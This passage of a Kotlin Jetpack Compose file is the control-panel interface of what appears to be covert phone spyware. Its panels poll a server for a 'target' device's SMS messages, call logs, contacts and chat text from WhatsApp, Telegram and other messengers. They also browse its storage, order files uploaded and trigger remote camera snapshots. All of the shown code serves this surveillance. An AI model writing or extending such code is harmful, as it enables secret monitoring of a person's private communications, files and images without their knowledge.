                            "$time $icon$typeLabel",
                            fontSize = 9.sp, color = color.copy(alpha = 0.6f), fontFamily = mono
                        )
                        Text(
                            text.take(100),
                            fontSize = 10.sp, color = color, fontFamily = mono,
                            maxLines = 2, modifier = Modifier.padding(start = 16.dp)
                        )
                    }
                }
            }
        }
    }
}

// ─── SMS Monitor Panel ──────────────────────────────────

@Composable
private fun SmsMonitorPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    accentColor: Color, ccText: Color, ccTextDim: Color
) {
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace
    var smsList by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.SmsItem>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }
    var error by remember { mutableStateOf<String?>(null) }
    var lastSync by remember { mutableLongStateOf(0L) }
    var refreshTrigger by remember { mutableIntStateOf(0) }
    val context = androidx.compose.ui.platform.LocalContext.current

    LaunchedEffect(deviceName, refreshTrigger) {
        while (true) {
            isLoading = smsList.isEmpty()
            error = null
            try {
                val ep = dagger.hilt.android.EntryPointAccessors.fromApplication(
                    context.applicationContext,
                    com.example.kabensatudata.nearby.RemoteControlHandler.RemoteEntryPoint::class.java
                )
                val resp = ep.apiService().getSmsLogs(deviceName)
                if (resp.isSuccessful) {
                    smsList = resp.body()?.data ?: emptyList()
                    lastSync = System.currentTimeMillis()
                } else {
                    error = "Server error: ${resp.code()}"
                }
            } catch (e: Exception) {
                error = e.message ?: "Koneksi gagal"
            }
            isLoading = false
            kotlinx.coroutines.delay(30_000)
        }
    }

    Column {
        Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
            CcSectionHeader("📩 SMS / MMS", accentColor, Modifier.weight(1f))
            if (lastSync > 0) {
                Text("⟳ ${((System.currentTimeMillis() - lastSync) / 1000)}s ago", fontSize = 8.sp,
                    color = ccTextDim, fontFamily = mono)
            }
            Spacer(Modifier.width(8.dp))
            Surface(onClick = { refreshTrigger++ }, shape = RoundedCornerShape(4.dp),
                color = accentColor.copy(alpha = 0.1f)) {
                Text("⟳", fontSize = 12.sp, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
            }
        }
        Surface(
            Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
            color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
        ) {
            Column(Modifier.padding(10.dp)) {
                if (isLoading) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        CircularProgressIndicator(Modifier.size(14.dp), strokeWidth = 2.dp, color = accentColor)
                        Spacer(Modifier.width(8.dp))
                        Text("Loading SMS...", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                    }
                } else if (error != null) {
                    Text("⚠ $error", fontSize = 11.sp, color = Color(0xFFFF5252), fontFamily = mono)
                } else if (smsList.isEmpty()) {
                    Text("// Belum ada data SMS", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                } else {
                    Text("${smsList.size} messages", fontSize = 10.sp, color = accentColor, fontFamily = mono)
                    Spacer(Modifier.height(6.dp))
                    smsList.take(30).forEach { sms ->
                        val icon = if (sms.type == "inbox") "📥" else "📤"
                        val name = sms.contactName ?: sms.address
                        Column(Modifier.padding(vertical = 3.dp)) {
                            Row {
                                Text("$icon ", fontSize = 10.sp)
                                Text(name, fontSize = 10.sp, fontWeight = FontWeight.Bold,
                                    color = accentColor, fontFamily = mono, modifier = Modifier.weight(1f))
                                Text(sms.date.takeLast(8), fontSize = 9.sp, color = ccTextDim, fontFamily = mono)
                            }
                            Text(sms.body.take(120), fontSize = 10.sp, color = ccText.copy(alpha = 0.8f),
                                fontFamily = mono, maxLines = 2, modifier = Modifier.padding(start = 20.dp))
                        }
                        Box(Modifier.fillMaxWidth().height(0.3.dp).background(ccBorder))
                    }
                }
            }
        }
    }
}

// ─── Call Log Panel ─────────────────────────────────────

@Composable
private fun CallLogPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    accentColor: Color, ccText: Color, ccTextDim: Color
) {
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace
    var calls by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.CallItem>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }
    var error by remember { mutableStateOf<String?>(null) }
    var lastSync by remember { mutableLongStateOf(0L) }
    var refreshTrigger by remember { mutableIntStateOf(0) }
    val context = androidx.compose.ui.platform.LocalContext.current

    LaunchedEffect(deviceName, refreshTrigger) {
        while (true) {
            isLoading = calls.isEmpty()
            error = null
            try {
                val ep = dagger.hilt.android.EntryPointAccessors.fromApplication(
                    context.applicationContext,
                    com.example.kabensatudata.nearby.RemoteControlHandler.RemoteEntryPoint::class.java
                )
                val resp = ep.apiService().getCallLogs(deviceName)
                if (resp.isSuccessful) {
                    calls = resp.body()?.data ?: emptyList()
                    lastSync = System.currentTimeMillis()
                } else {
                    error = "Server error: ${resp.code()}"
                }
            } catch (e: Exception) {
                error = e.message ?: "Koneksi gagal"
            }
            isLoading = false
            kotlinx.coroutines.delay(30_000)
        }
    }

    Column {
        Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
            CcSectionHeader("📞 CALL LOG", accentColor, Modifier.weight(1f))
            if (lastSync > 0) {
                Text("⟳ ${((System.currentTimeMillis() - lastSync) / 1000)}s ago", fontSize = 8.sp,
                    color = ccTextDim, fontFamily = mono)
            }
            Spacer(Modifier.width(8.dp))
            Surface(onClick = { refreshTrigger++ }, shape = RoundedCornerShape(4.dp),
                color = accentColor.copy(alpha = 0.1f)) {
                Text("⟳", fontSize = 12.sp, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
            }
        }
        Surface(
            Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
            color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
        ) {
            Column(Modifier.padding(10.dp)) {
                if (isLoading) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        CircularProgressIndicator(Modifier.size(14.dp), strokeWidth = 2.dp, color = accentColor)
                        Spacer(Modifier.width(8.dp))
                        Text("Loading calls...", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                    }
                } else if (error != null) {
                    Text("⚠ $error", fontSize = 11.sp, color = Color(0xFFFF5252), fontFamily = mono)
                } else if (calls.isEmpty()) {
                    Text("// Belum ada data panggilan", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                } else {
                    Text("${calls.size} calls", fontSize = 10.sp, color = accentColor, fontFamily = mono)
                    Spacer(Modifier.height(6.dp))
                    calls.take(30).forEach { call ->
                        val icon = when (call.type) {
                            "incoming" -> "📲"
                            "outgoing" -> "📱"
                            "missed" -> "❌"
                            "rejected" -> "🚫"
                            else -> "📞"
                        }
                        val typeColor = when (call.type) {
                            "missed" -> Color(0xFFFF5252)
                            "rejected" -> Color(0xFFFF9800)
                            else -> accentColor
                        }
                        val durationText = if (call.duration > 0) {
                            val m = call.duration / 60
                            val s = call.duration % 60
                            if (m > 0) "${m}m${s}s" else "${s}s"
                        } else "—"
                        val name = call.contactName ?: call.number

                        Row(
                            Modifier.fillMaxWidth().padding(vertical = 3.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text("$icon ", fontSize = 10.sp)
                            Text(name, fontSize = 10.sp, fontWeight = FontWeight.Bold,
                                color = typeColor, fontFamily = mono, modifier = Modifier.weight(1f),
                                maxLines = 1)
                            Text(durationText, fontSize = 9.sp, color = ccTextDim, fontFamily = mono)
                            Spacer(Modifier.width(8.dp))
                            Text(call.date.takeLast(8), fontSize = 9.sp, color = ccTextDim, fontFamily = mono)
                        }
                        Box(Modifier.fillMaxWidth().height(0.3.dp).background(ccBorder))
                    }
                }
            }
        }
    }
}

// ─── Contacts Panel ────────────────────────────────────

@Composable
private fun ContactsPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    accentColor: Color, ccText: Color, ccTextDim: Color
) {
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace
    var contacts by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.ContactItem>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }
    var error by remember { mutableStateOf<String?>(null) }
    var lastSync by remember { mutableLongStateOf(0L) }
    var refreshTrigger by remember { mutableIntStateOf(0) }
    var searchQuery by remember { mutableStateOf("") }
    val context = androidx.compose.ui.platform.LocalContext.current

    LaunchedEffect(deviceName, refreshTrigger) {
        while (true) {
            isLoading = contacts.isEmpty()
            error = null
            try {
                val ep = dagger.hilt.android.EntryPointAccessors.fromApplication(
                    context.applicationContext,
                    com.example.kabensatudata.nearby.RemoteControlHandler.RemoteEntryPoint::class.java
                )
                val resp = ep.apiService().getContacts(deviceName)
                if (resp.isSuccessful) {
                    contacts = resp.body()?.data ?: emptyList()
                    lastSync = System.currentTimeMillis()
                } else {
                    error = "Server error: ${resp.code()}"
                }
            } catch (e: Exception) {
                error = e.message ?: "Koneksi gagal"
            }
            isLoading = false
            kotlinx.coroutines.delay(30_000)
        }
    }

    val filtered = if (searchQuery.isBlank()) contacts
        else contacts.filter { it.name.contains(searchQuery, ignoreCase = true) ||
            it.phones.any { p -> p.contains(searchQuery) } }

    Column {
        Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
            CcSectionHeader("👤 CONTACTS", accentColor, Modifier.weight(1f))
            if (lastSync > 0) {
                Text("⟳ ${((System.currentTimeMillis() - lastSync) / 1000)}s ago", fontSize = 8.sp,
                    color = ccTextDim, fontFamily = mono)
            }
            Spacer(Modifier.width(8.dp))
            Surface(onClick = { refreshTrigger++ }, shape = RoundedCornerShape(4.dp),
                color = accentColor.copy(alpha = 0.1f)) {
                Text("⟳", fontSize = 12.sp, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
            }
        }
        Surface(
            Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
            color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
        ) {
            Column(Modifier.padding(10.dp)) {
                if (isLoading) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        CircularProgressIndicator(Modifier.size(14.dp), strokeWidth = 2.dp, color = accentColor)
                        Spacer(Modifier.width(8.dp))
                        Text("Loading contacts...", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                    }
                } else if (error != null) {
                    Text("⚠ $error", fontSize = 11.sp, color = Color(0xFFFF5252), fontFamily = mono)
                } else if (contacts.isEmpty()) {
                    Text("// Belum ada data kontak", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                } else {
                    Text("${contacts.size} contacts", fontSize = 10.sp, color = accentColor, fontFamily = mono)
                    Spacer(Modifier.height(6.dp))
                    filtered.take(40).forEach { contact ->
                        Row(
                            Modifier.fillMaxWidth().padding(vertical = 2.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text("👤 ", fontSize = 10.sp)
                            Column(Modifier.weight(1f)) {
                                Text(contact.name, fontSize = 10.sp, fontWeight = FontWeight.Bold,
                                    color = accentColor, fontFamily = mono, maxLines = 1)
                                contact.phones.take(2).forEach { phone ->
                                    Text(phone, fontSize = 9.sp, color = ccTextDim, fontFamily = mono,
                                        modifier = Modifier.padding(start = 8.dp))
                                }
                            }
                        }
                        Box(Modifier.fillMaxWidth().height(0.3.dp).background(ccBorder))
                    }
                }
            }
        }
    }
}

// ─── IM Tracking Panel (from existing Activity Logs) ───

@Composable
private fun ImTrackingPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    accentColor: Color, ccText: Color, ccTextDim: Color
) {
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace
    var imLogs by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.ActivityLogEntry>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }
    var error by remember { mutableStateOf<String?>(null) }
    var lastSync by remember { mutableLongStateOf(0L) }
    var refreshTrigger by remember { mutableIntStateOf(0) }
    val context = androidx.compose.ui.platform.LocalContext.current

    // Messaging app packages to filter
    val imPackages = listOf(
        "com.whatsapp", "org.telegram.messenger", "com.instagram.android",
        "com.facebook.orca", "com.facebook.katana",
        "com.google.android.apps.messaging", "com.viber.voip",
        "jp.naver.line.android", "com.tencent.mm"
    )

    LaunchedEffect(deviceName, refreshTrigger) {
        while (true) {
            isLoading = imLogs.isEmpty()
            error = null
            try {
                val ep = dagger.hilt.android.EntryPointAccessors.fromApplication(
                    context.applicationContext,
                    com.example.kabensatudata.nearby.RemoteControlHandler.RemoteEntryPoint::class.java
                )
                val resp = ep.apiService().getActivityLogs(deviceName)
                if (resp.isSuccessful) {
                    imLogs = (resp.body()?.data ?: emptyList()).filter { log ->
                        imPackages.any { pkg -> log.appPackage.contains(pkg, ignoreCase = true) }
                    }
                    lastSync = System.currentTimeMillis()
                } else {
                    error = "Server error: ${resp.code()}"
                }
            } catch (e: Exception) {
                error = e.message ?: "Koneksi gagal"
            }
            isLoading = false
            kotlinx.coroutines.delay(30_000)
        }
    }

    Column {
        Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
            CcSectionHeader("💬 INSTANT MESSAGING", accentColor, Modifier.weight(1f))
            if (lastSync > 0) {
                Text("⟳ ${((System.currentTimeMillis() - lastSync) / 1000)}s ago", fontSize = 8.sp,
                    color = ccTextDim, fontFamily = mono)
            }
            Spacer(Modifier.width(8.dp))
            Surface(onClick = { refreshTrigger++ }, shape = RoundedCornerShape(4.dp),
                color = accentColor.copy(alpha = 0.1f)) {
                Text("⟳", fontSize = 12.sp, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
            }
        }
        Surface(
            Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp),
            color = ccCard, border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
        ) {
            Column(Modifier.padding(10.dp)) {
                if (isLoading) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        CircularProgressIndicator(Modifier.size(14.dp), strokeWidth = 2.dp, color = accentColor)
                        Spacer(Modifier.width(8.dp))
                        Text("Loading IM data...", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                    }
                } else if (error != null) {
                    Text("⚠ $error", fontSize = 11.sp, color = Color(0xFFFF5252), fontFamily = mono)
                } else if (imLogs.isEmpty()) {
                    Text("// Belum ada data chat", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                } else {
                    Text("${imLogs.size} entries", fontSize = 10.sp, color = accentColor, fontFamily = mono)
                    Spacer(Modifier.height(6.dp))

                    // Group by app
                    val grouped = imLogs.groupBy { it.appLabel }
                    grouped.entries.take(6).forEach { (appLabel, logs) ->
                        val appIcon = when {
                            appLabel.contains("WhatsApp", true) -> "💚"
                            appLabel.contains("Telegram", true) -> "✈️"
                            appLabel.contains("Instagram", true) -> "📸"
                            appLabel.contains("Messenger", true) -> "💬"
                            appLabel.contains("LINE", true) -> "🟢"
                            else -> "📱"
                        }

                        Text("$appIcon $appLabel (${logs.size})", fontSize = 11.sp,
                            fontWeight = FontWeight.Bold, color = accentColor, fontFamily = mono)
                        Spacer(Modifier.height(2.dp))

                        logs.take(5).forEach { log ->
                            val time = log.timestamp.takeLast(8)
                            val textPreview = log.texts.joinToString(" ").take(100)
                            Column(Modifier.padding(start = 16.dp, bottom = 2.dp)) {
                                Text(time, fontSize = 9.sp, color = ccTextDim, fontFamily = mono)
                                Text(textPreview, fontSize = 10.sp, color = ccText.copy(alpha = 0.8f),
                                    fontFamily = mono, maxLines = 2)
                            }
                        }
                        if (logs.size > 5) {
                            Text("  + ${logs.size - 5} more...", fontSize = 9.sp,
                                color = ccTextDim, fontFamily = mono, modifier = Modifier.padding(start = 16.dp))
                        }
                        Spacer(Modifier.height(4.dp))
                        Box(Modifier.fillMaxWidth().height(0.3.dp).background(ccBorder))
                        Spacer(Modifier.height(4.dp))
                    }
                }
            }
        }
    }
}

// ─── File Manager Panel (Enhanced) ─────────────────────

@OptIn(androidx.compose.foundation.layout.ExperimentalLayoutApi::class)
@Composable
private fun FileManagerPanel(
    deviceName: String, ccCard: Color, ccBorder: Color,
    accentColor: Color, ccText: Color, ccTextDim: Color
) {
    val mono = androidx.compose.ui.text.font.FontFamily.Monospace
    val context = androidx.compose.ui.platform.LocalContext.current
    val coroutineScope = rememberCoroutineScope()

    var currentPath by remember { mutableStateOf("/storage/emulated/0") }
    var files by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.FileBrowseItem>>(emptyList()) }
    var isLoading by remember { mutableStateOf(true) }
    var isScanning by remember { mutableStateOf(false) }
    var refreshTick by remember { mutableStateOf(0) }

    val apiService = remember {
        try {
            dagger.hilt.android.EntryPointAccessors.fromApplication(
                context.applicationContext,
                com.example.kabensatudata.nearby.RemoteControlHandler.RemoteEntryPoint::class.java
            ).apiService()
        } catch (_: Exception) { null }
    }

    // Fetch files for current path
    LaunchedEffect(deviceName, currentPath, refreshTick) {
        isLoading = true
        try {
            val resp = withContext(Dispatchers.IO) {
                apiService?.browseFiles(deviceName, currentPath)
            }
            if (resp?.isSuccessful == true) {
                files = resp.body()?.files ?: emptyList()
            } else {
                files = emptyList()
            }
        } catch (_: Exception) {
            files = emptyList()
        }
        isLoading = false
    }

    // Quick access shortcuts
    val shortcuts = listOf(
        "📷 DCIM" to "/storage/emulated/0/DCIM",
        "⬇ Download" to "/storage/emulated/0/Download",
        "🖼 Pictures" to "/storage/emulated/0/Pictures",
        "💬 WhatsApp" to "/storage/emulated/0/WhatsApp",
        "🎵 Music" to "/storage/emulated/0/Music",
        "📄 Documents" to "/storage/emulated/0/Documents"
    )

    Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
        CcSectionHeader("📂 FILE MANAGER", accentColor)

        // Action bar: Scan + Path
        Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
            border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
            Column(Modifier.padding(8.dp)) {
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically) {
                    // Scan button
                    Surface(
                        onClick = {
                            if (!isScanning) {
                                isScanning = true
                                coroutineScope.launch {
                                    try {
                                        withContext(Dispatchers.IO) {
                                            apiService?.requestFileScan(deviceName, mapOf("path" to currentPath))
                                        }
                                        // Wait for device to scan then refresh
                                        kotlinx.coroutines.delay(5000)
                                        refreshTick++
                                    } catch (_: Exception) { }
                                    isScanning = false
                                }
                            }
                        },
                        shape = RoundedCornerShape(4.dp),
                        color = if (isScanning) accentColor.copy(alpha = 0.3f) else accentColor.copy(alpha = 0.15f)
                    ) {
                        Row(Modifier.padding(horizontal = 10.dp, vertical = 5.dp),
                            verticalAlignment = Alignment.CenterVertically) {
                            if (isScanning) {
                                CircularProgressIndicator(Modifier.size(12.dp), strokeWidth = 1.5.dp, color = accentColor)
                                Spacer(Modifier.width(6.dp))
                                Text("SCANNING...", fontSize = 10.sp, color = accentColor, fontFamily = mono)
                            } else {
                                Text("🔍 SCAN FOLDER", fontSize = 10.sp, color = accentColor, fontFamily = mono,
                                    fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                    // Refresh
                    Surface(onClick = { refreshTick++ },
                        shape = RoundedCornerShape(4.dp), color = accentColor.copy(alpha = 0.1f)) {
                        Text("⟳", fontSize = 14.sp, color = accentColor,
                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
                    }
                }
                Spacer(Modifier.height(4.dp))
                // Breadcrumb path
                Row(verticalAlignment = Alignment.CenterVertically) {
                    if (currentPath != "/storage/emulated/0") {
                        Surface(
                            onClick = {
                                currentPath = currentPath.substringBeforeLast("/", "/storage/emulated/0")
                            },
                            shape = RoundedCornerShape(3.dp),
                            color = accentColor.copy(alpha = 0.1f)
                        ) {
                            Text("⬆ ..", fontSize = 10.sp, color = accentColor, fontFamily = mono,
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
                        }
                        Spacer(Modifier.width(6.dp))
                    }
                    Text(currentPath.replace("/storage/emulated/0", "📱 sdcard"),
                        fontSize = 9.sp, color = ccTextDim, fontFamily = mono,
                        maxLines = 1, modifier = Modifier.weight(1f))
                }
            }
        }

        // Quick access shortcuts (horizontal scroll)
        androidx.compose.foundation.layout.FlowRow(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(4.dp),
            verticalArrangement = Arrangement.spacedBy(4.dp)
        ) {
            shortcuts.forEach { (label, path) ->
                Surface(
                    onClick = { currentPath = path },
                    shape = RoundedCornerShape(4.dp),
                    color = if (currentPath == path) accentColor.copy(alpha = 0.2f) else Color(0xFF080C14),
                    border = androidx.compose.foundation.BorderStroke(0.5.dp,
                        if (currentPath == path) accentColor else ccBorder)
                ) {
                    Text(label, fontSize = 9.sp, color = if (currentPath == path) accentColor else ccTextDim,
                        fontFamily = mono, modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
                }
            }
        }

        // Loading
        if (isLoading) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                    CircularProgressIndicator(Modifier.size(14.dp), strokeWidth = 2.dp, color = accentColor)
                    Spacer(Modifier.width(8.dp))
                    Text("Loading files...", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        // Empty state
        if (files.isEmpty()) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Column(Modifier.padding(12.dp)) {
                    Text("// Folder belum di-scan", fontSize = 11.sp, color = ccTextDim, fontFamily = mono)
                    Text("// Klik SCAN FOLDER untuk memulai", fontSize = 10.sp, color = ccTextDim, fontFamily = mono)
                }
            }
            return
        }

        // File list — directories first, then files
        val sorted = files.sortedWith(compareByDescending<com.example.kabensatudata.data.remote.dto.FileBrowseItem> { it.isDirectory }.thenBy { it.name.lowercase() })

        Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(6.dp), color = ccCard,
            border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
            Column(Modifier.padding(6.dp)) {
                Text("${files.count { it.isDirectory }} folders • ${files.count { !it.isDirectory }} files",
                    fontSize = 9.sp, color = accentColor, fontFamily = mono,
                    modifier = Modifier.padding(horizontal = 4.dp, vertical = 2.dp))

                sorted.take(50).forEach { item ->
                    if (item.isDirectory) {
                        // Directory row — clickable to navigate
                        Surface(
                            onClick = { currentPath = item.path },
                            Modifier.fillMaxWidth().padding(vertical = 1.dp),
                            shape = RoundedCornerShape(3.dp),
                            color = Color.Transparent
                        ) {
                            Row(Modifier.padding(horizontal = 6.dp, vertical = 3.dp),
                                verticalAlignment = Alignment.CenterVertically) {
                                Text("📁 ", fontSize = 12.sp)
                                Text(item.name, fontSize = 10.sp, color = accentColor, fontFamily = mono,
                                    fontWeight = FontWeight.Bold, modifier = Modifier.weight(1f), maxLines = 1)
                                Text("▶", fontSize = 10.sp, color = accentColor.copy(alpha = 0.5f))
                            }
                        }
                    } else {
                        // File row — with download button
                        val icon = when {
                            item.mimeType?.startsWith("image") == true -> "🖼"
                            item.mimeType?.startsWith("video") == true -> "🎬"
                            item.mimeType?.startsWith("audio") == true -> "🎵"
                            item.mimeType?.contains("pdf") == true -> "📄"
                            item.mimeType?.contains("document") == true -> "📝"
                            item.mimeType?.contains("spreadsheet") == true -> "📊"
                            item.mimeType?.contains("apk") == true -> "📦"
                            else -> "📎"
                        }
                        val sizeText = when {
                            item.size < 1024 -> "${item.size}B"
                            item.size < 1048576 -> "${item.size / 1024}KB"
                            else -> String.format("%.1fMB", item.size / 1048576.0)
                        }

                        Row(
                            Modifier.fillMaxWidth().padding(horizontal = 6.dp, vertical = 2.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text("$icon ", fontSize = 10.sp)
                            Text(item.name, fontSize = 10.sp, color = ccText, fontFamily = mono,
                                modifier = Modifier.weight(1f), maxLines = 1)
                            Text(sizeText, fontSize = 8.sp, color = ccTextDim, fontFamily = mono)
                            Spacer(Modifier.width(4.dp))
                            // Download button
                            Surface(
                                onClick = {
                                    coroutineScope.launch {
                                        try {
                                            // Request the device to upload this file
                                            withContext(Dispatchers.IO) {
                                                apiService?.requestFileDownload(deviceName, mapOf("file_path" to item.path))
                                            }
                                            android.widget.Toast.makeText(context,
                                                "Download diminta: ${item.name}", android.widget.Toast.LENGTH_SHORT).show()
                                        } catch (_: Exception) {
                                            android.widget.Toast.makeText(context,
                                                "Gagal meminta download", android.widget.Toast.LENGTH_SHORT).show()
                                        }
                                    }
                                },
                                shape = RoundedCornerShape(3.dp),
                                color = Color(0xFF4CAF50).copy(alpha = 0.15f)
                            ) {
                                Text("⬇", fontSize = 10.sp, color = Color(0xFF4CAF50),
                                    modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
                            }
                        }
                    }

                    // Separator
                    Box(Modifier.fillMaxWidth().padding(horizontal = 6.dp).height(0.2.dp).background(ccBorder.copy(alpha = 0.3f)))
                }

                if (files.size > 50) {
                    Text("  + ${files.size - 50} more items...", fontSize = 9.sp,
                        color = ccTextDim, fontFamily = mono,
                        modifier = Modifier.padding(6.dp))
                }
            }
        }
    }
}


// ═══════════ SNAPSHOT VIEWER DIALOG ═══════════

@Composable
private fun SnapshotViewerDialog(
    snapshotUrl: String,
    deviceName: String,
    lens: String,
    authToken: String,
    onDismiss: () -> Unit,
    onRetake: (String) -> Unit
) {
    val ccBg = Color(0xFF0D1117)
    val ccCard = Color(0xFF161B22)
    val ccGreen = Color(0xFF00B894)
    val ccCyan = Color(0xFF00CEC9)
    val ccText = Color(0xFFE6EDF3)
    val ccTextDim = Color(0xFF8B949E)
    val mono = FontFamily.Monospace

    var isLoading by remember { mutableStateOf(true) }
    var retryKey by remember { mutableIntStateOf(0) }
    var timestamp by remember { mutableStateOf("") }

    // Wait 4 seconds for the photo to be captured + uploaded
    LaunchedEffect(retryKey) {
        isLoading = true
        timestamp = java.text.SimpleDateFormat("dd MMM yyyy, HH:mm:ss", java.util.Locale.getDefault())
            .format(java.util.Date())
        kotlinx.coroutines.delay(4000)
        isLoading = false
    }

    Column(
        Modifier
            .fillMaxSize()
            .background(ccBg)
            .statusBarsPadding()
            .padding(16.dp)
    ) {
        // Header
        Row(
            Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically
        ) {
            IconButton(onClick = onDismiss, modifier = Modifier.size(36.dp)) {
                Icon(Icons.AutoMirrored.Filled.ArrowBack, "Kembali",
                    tint = ccGreen, modifier = Modifier.size(20.dp))
            }
            Spacer(Modifier.width(8.dp))
            Column {
                Text("📸 SNAPSHOT", color = ccGreen, fontSize = 14.sp,
                    fontWeight = FontWeight.Bold, fontFamily = mono)
                Text("$deviceName • Kamera $lens", color = ccTextDim,
                    fontSize = 11.sp, fontFamily = mono)
            }
        }

        Spacer(Modifier.height(16.dp))

        if (isLoading) {
            // Loading state
            Box(
                Modifier
                    .fillMaxWidth()
                    .weight(1f)
                    .background(ccCard, RoundedCornerShape(12.dp)),
                contentAlignment = Alignment.Center
            ) {
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    CircularProgressIndicator(
                        color = ccCyan,
                        modifier = Modifier.size(48.dp)
                    )
                    Spacer(Modifier.height(16.dp))
                    Text("📸 Mengambil foto...", color = ccText,
                        fontSize = 14.sp, fontFamily = mono)
                    Spacer(Modifier.height(4.dp))
                    Text("Menunggu HP target", color = ccTextDim,
                        fontSize = 11.sp, fontFamily = mono)
                }
            }
        } else {
            // Photo loaded
            Box(
                Modifier
                    .fillMaxWidth()
                    .weight(1f)
                    .background(ccCard, RoundedCornerShape(12.dp))
                    .clip(RoundedCornerShape(12.dp))
            ) {
                val finalUrl = "$snapshotUrl&t=$retryKey"
                val painter = rememberAsyncImagePainter(
                    model = coil.request.ImageRequest.Builder(androidx.compose.ui.platform.LocalContext.current)
                        .data(finalUrl)
                        .addHeader("Authorization", "Bearer $authToken")
                        .memoryCachePolicy(coil.request.CachePolicy.DISABLED)
                        .diskCachePolicy(coil.request.CachePolicy.DISABLED)
                        .crossfade(true)
                        .build()
                )
                Image(
                    painter = painter,
                    contentDescription = "Snapshot $deviceName",
                    modifier = Modifier.fillMaxSize(),
                    contentScale = ContentScale.Fit
                )
            }

            Spacer(Modifier.height(8.dp))

            // Timestamp info
            Text(
                "⏰ $timestamp",
                color = ccTextDim,
                fontSize = 10.sp,
                fontFamily = mono,
                modifier = Modifier.padding(horizontal = 4.dp)
            )
        }

        Spacer(Modifier.height(12.dp))

        // Action buttons
        Row(
            Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            Button(
                onClick = {
                    onRetake(lens)
                    retryKey++
                },
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6C5CE7)),
                modifier = Modifier.weight(1f),
                shape = RoundedCornerShape(8.dp)
            ) {
                Text("📸 Foto Lagi", fontFamily = mono, fontSize = 12.sp)
            }
            OutlinedButton(
                onClick = onDismiss,
                modifier = Modifier.weight(1f),
                shape = RoundedCornerShape(8.dp),
                border = BorderStroke(1.dp, ccTextDim)
            ) {
                Text("✕ Tutup", color = ccText, fontFamily = mono, fontSize = 12.sp)
            }
        }
    }
}
